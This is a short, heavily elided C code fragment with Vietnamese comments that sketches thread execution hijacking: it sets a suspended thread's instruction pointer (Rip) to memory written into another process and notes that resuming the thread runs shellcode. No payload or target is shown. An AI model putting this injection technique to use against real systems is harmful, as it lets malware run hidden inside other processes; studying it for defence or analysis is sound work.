...
int main() {
    ...
    // 5. VirtualAllocEx & WriteProcessMemory 
    ...
    // Lấy trạng thái hiện tại của Thread
    if (GetThreadContext(hThread, &ctx)) {
        ctx.Rip = (DWORD64)pRemoteCode;

        // Cập nhật lại Context cho Thread
        SetThreadContext(hThread, &ctx);
    }

    // 7. ResumeThread và chạy shellcode
